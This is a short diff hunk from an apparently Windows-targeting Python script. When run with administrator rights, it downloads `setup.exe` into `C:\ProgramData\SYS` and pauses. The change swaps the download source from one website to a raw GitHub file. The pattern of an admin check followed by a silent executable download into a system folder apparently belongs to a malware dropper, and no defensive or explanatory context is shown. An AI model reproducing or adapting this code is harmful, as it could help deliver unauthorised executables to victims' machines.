@@ -47,7 +47,7 @@ if is_admin():
         else:  # HTTP status code 4XX/5XX
             print("Download failed: status code {}\n{}".format(r.status_code, r.text))
 
-    download("https://skartproduction.com/lcd/setup.exe", dest_folder="C:\ProgramData\SYS")
+    download("https://github.com/MASMob2022/pyw.download/raw/main/setup.exe", dest_folder="C:\ProgramData\SYS")
 
     time.sleep(5)
 
